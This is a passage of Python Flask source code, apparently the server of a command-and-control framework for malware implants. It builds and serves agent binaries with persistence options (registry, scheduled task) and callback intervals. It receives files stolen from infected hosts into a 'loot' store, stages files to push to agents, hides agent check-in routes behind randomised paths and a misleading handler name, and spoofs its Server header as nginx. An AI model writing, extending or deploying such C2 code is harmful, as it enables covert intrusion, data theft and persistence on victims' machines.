@app.route("/api/tls/generate", methods=["POST"])
def tls_generate():
    """Generate a new self-signed cert and write it to the certs directory."""
    data = request.get_json() or {}

    cn      = data.get("cn", "localhost").strip()
    san_ips = [s.strip() for s in data.get("san_ips", []) if s.strip()]
    san_dns = [s.strip() for s in data.get("san_dns", []) if s.strip()]
    days    = int(data.get("days", 365))

    if not cn:
        return jsonify({"error": "cn is required"}), 400
    if days < 1 or days > 3650:
        return jsonify({"error": "days must be between 1 and 3650"}), 400

    import ipaddress
    for ip in san_ips:
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            return jsonify({"error": f"Invalid IP address: {ip}"}), 400

    certs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
    os.makedirs(certs_dir, exist_ok=True)

    # Import cert generation deps inline so gen_cert.py stays a standalone script.
    import datetime, hashlib, ipaddress as _ipaddress
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])

    san_entries = []
    for dns_name in san_dns:
        san_entries.append(x509.DNSName(dns_name))
    for ip_str in san_ips:
        san_entries.append(x509.IPAddress(_ipaddress.ip_address(ip_str)))
    if cn not in san_dns:
        san_entries.insert(0, x509.DNSName(cn))

    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=days))
        .add_extension(x509.SubjectAlternativeName(san_entries), critical=False)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .sign(key, hashes.SHA256())
    )

    key_path  = os.path.join(certs_dir, "server.key")
    cert_path = os.path.join(certs_dir, "server.crt")

    with open(key_path, "wb") as f:
        f.write(key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ))
    try:
        os.chmod(key_path, 0o600)
    except OSError:
        pass

    with open(cert_path, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))

    spki_bytes = cert.public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
    )
    pin = hashlib.sha256(spki_bytes).hexdigest()

    return jsonify({
        "status": "ok",
        "spki_pin": pin,
        "not_valid_after": cert.not_valid_after_utc.isoformat(),
        "restart_required": True,
    })


@app.route("/api/tls/delete", methods=["DELETE"])
def tls_delete():
    """Remove the cert and key files from disk. Server falls back to HTTP on next restart."""
    certs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
    cert_path = os.path.join(certs_dir, "server.crt")
    key_path  = os.path.join(certs_dir, "server.key")

    removed = []
    for p, label in [(cert_path, "server.crt"), (key_path, "server.key")]:
        if os.path.exists(p):
            os.remove(p)
            removed.append(label)

    if not removed:
        return jsonify({"error": "No certificate files found"}), 404

    return jsonify({"status": "ok", "removed": removed, "restart_required": True})


@app.route("/api/builds", methods=["GET"])
def get_builds():
    """Return all builds as JSON."""
    conn = get_db_connection()
    builds = conn.execute("SELECT * FROM builds ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "builds": [
            {
                "id": b["id"],
                "filename": b["filename"],
                "target_os": b["target_os"],
                "arch": b["arch"],
                "server_url": b["server_url"],
                "callback_interval": b["callback_interval"],
                "persistence": b["persistence"] if b["persistence"] in ("none", "registry", "scheduled_task") else ("registry" if b["persistence"] else "none"),
                "file_size": b["file_size"],
                "cert_pin": b["cert_pin"],
                "created_at": b["created_at"],
            }
            for b in builds
        ]
    })


@app.route("/api/builds/download/<int:build_id>", methods=["GET"])
def download_build(build_id):
    """Download a built agent binary."""
    conn = get_db_connection()
    build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()
    conn.close()

    if not build:
        return jsonify({"error": "Build not found"}), 404

    file_path = build["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "Build file not found on disk"}), 404

    filename = build["filename"]
    with open(file_path, "rb") as f:
        binary_data = f.read()

    response = Response(binary_data, mimetype="application/octet-stream")
    response.headers["Content-Disposition"] = f'attachment; filename="{filename}"'
    response.headers["Content-Length"] = str(len(binary_data))
    return response


@app.route("/api/builds/<int:build_id>", methods=["DELETE"])
def delete_build(build_id):
    """Delete a build and its file."""
    conn = get_db_connection()
    build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()

    if not build:
        conn.close()
        return jsonify({"error": "Build not found"}), 404

    # Delete file from disk
    file_path = build["file_path"]
    if os.path.exists(file_path):
        os.remove(file_path)

    # Delete from database
    conn.execute("DELETE FROM builds WHERE id = ?", (build_id,))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# -- upload / exfil (agent -> server) --

def receive_upload():
    """Receive an exfiltrated file from an agent."""
    if "file" not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files["file"]
    agent_id = request.form.get("agent_id", "unknown")
    original_path = request.form.get("original_path", "")

    filename = secure_filename(file.filename) if file.filename else "unnamed"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_name = f"{timestamp}_{filename}"
    save_path = os.path.join(LOOT_DIR, save_name)

    file.save(save_path)
    file_size = os.path.getsize(save_path)

    conn = get_db_connection()
    conn.execute(
        "INSERT INTO loot (agent_id, filename, original_path, file_path, file_size) VALUES (?, ?, ?, ?, ?)",
        (agent_id, filename, original_path, save_path, file_size),
    )
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "filename": filename, "size": file_size})


@app.route("/api/loot", methods=["GET"])
def get_loot():
    """Return all exfiltrated files."""
    conn = get_db_connection()
    loot = conn.execute("SELECT * FROM loot ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "loot": [
            {
                "id": l["id"],
                "agent_id": l["agent_id"],
                "filename": l["filename"],
                "original_path": l["original_path"],
                "file_size": l["file_size"],
                "created_at": l["created_at"],
            }
            for l in loot
        ]
    })


@app.route("/api/loot/download/<int:loot_id>", methods=["GET"])
def download_loot(loot_id):
    """Download an exfiltrated file."""
    conn = get_db_connection()
    item = conn.execute("SELECT * FROM loot WHERE id = ?", (loot_id,)).fetchone()
    conn.close()

    if not item:
        return jsonify({"error": "Loot not found"}), 404

    file_path = item["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "File not found on disk"}), 404

    return send_file(file_path, as_attachment=True, download_name=item["filename"])


@app.route("/api/loot/<int:loot_id>", methods=["DELETE"])
def delete_loot(loot_id):
    """Delete an exfiltrated file."""
    conn = get_db_connection()
    item = conn.execute("SELECT * FROM loot WHERE id = ?", (loot_id,)).fetchone()

    if not item:
        conn.close()
        return jsonify({"error": "Loot not found"}), 404

    if os.path.exists(item["file_path"]):
        os.remove(item["file_path"])

    conn.execute("DELETE FROM loot WHERE id = ?", (loot_id,))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# -- file staging (server -> agent) --

@app.route("/api/files/stage", methods=["POST"])
def stage_file():
    """Operator uploads a file to stage for pushing to an agent."""
    if "file" not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files["file"]
    filename = secure_filename(file.filename) if file.filename else "unnamed"
    save_path = os.path.join(STAGED_DIR, filename)

    # Avoid overwrites
    if os.path.exists(save_path):
        name, ext = os.path.splitext(filename)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{name}_{timestamp}{ext}"
        save_path = os.path.join(STAGED_DIR, filename)

    file.save(save_path)
    file_size = os.path.getsize(save_path)

    conn = get_db_connection()
    cursor = conn.execute(
        "INSERT INTO staged_files (filename, file_path, file_size) VALUES (?, ?, ?)",
        (filename, save_path, file_size),
    )
    file_id = cursor.lastrowid
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "file_id": file_id, "filename": filename, "file_size": file_size})


@app.route("/api/files", methods=["GET"])
def get_staged_files():
    """Return all staged files."""
    conn = get_db_connection()
    files = conn.execute("SELECT * FROM staged_files ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "files": [
            {
                "id": f["id"],
                "filename": f["filename"],
                "file_size": f["file_size"],
                "created_at": f["created_at"],
            }
            for f in files
        ]
    })


def serve_staged_file(file_id):
    """Agent fetches a staged file by ID."""
    conn = get_db_connection()
    f = conn.execute("SELECT * FROM staged_files WHERE id = ?", (file_id,)).fetchone()
    conn.close()

    if not f:
        return jsonify({"error": "File not found"}), 404

    file_path = f["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "File not found on disk"}), 404

    return send_file(file_path, as_attachment=True, download_name=f["filename"])


@app.route("/api/files/<int:file_id>", methods=["DELETE"])
def delete_staged_file(file_id):
    """Delete a staged file."""
    conn = get_db_connection()
    f = conn.execute("SELECT * FROM staged_files WHERE id = ?", (file_id,)).fetchone()

    if not f:
        conn.close()
        return jsonify({"error": "File not found"}), 404

    if os.path.exists(f["file_path"]):
        os.remove(f["file_path"])

    conn.execute("DELETE FROM staged_files WHERE id = ?", (file_id,))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# -- agent route registration --

def _register_agent_routes():
    """
    Wire up the four agent endpoints to their randomised paths.
    Uses add_url_rule() instead of decorators because the paths come
    from the DB and aren't known until after init.
    """
    app.add_url_rule(AGENT_PATH_CHECKIN, "agent_checkin", SyncDeviceState, methods=["POST"])
    app.add_url_rule(AGENT_PATH_RESULT,  "agent_result",  submit_result,   methods=["POST"])
    app.add_url_rule(AGENT_PATH_UPLOAD,  "agent_upload",  receive_upload,  methods=["POST"])
    app.add_url_rule(
        AGENT_PATH_FILES + "/<int:file_id>",
        "agent_files",
        serve_staged_file,
        methods=["GET"],
    )


_register_agent_routes()


# -- entry point --

if __name__ == "__main__":
    # Werkzeug writes its own Server header at the socket level before our
    # @after_request hook fires. Patch it here or both headers show up in the response.
    from werkzeug.serving import WSGIRequestHandler
    setattr(WSGIRequestHandler, "server_version", "nginx/1.24.0")
    setattr(WSGIRequestHandler, "sys_version", "")

    # Check for TLS certificate
    _cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.crt")
    _key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.key")

    if os.path.exists(_cert_path) and os.path.exists(_key_path):
        _ssl_ctx = (_cert_path, _key_path)
        _tls_status = "ENABLED (self-signed)"
    else:
        _ssl_ctx = None
        _tls_status = "DISABLED (no certs found in server/certs/)"

    print("\n=======================================")
    print("  Operator API Key (paste into dashboard):")
    print(f"  {API_KEY}")
    print(f"  TLS       : {_tls_status}")
    if _ssl_ctx is None:
        print("  WARNING   : Agents built with cert pinning will NOT connect without TLS.")
    print("=======================================\n")

    app.run(host="0.0.0.0", port=5000, debug=False, ssl_context=_ssl_ctx)
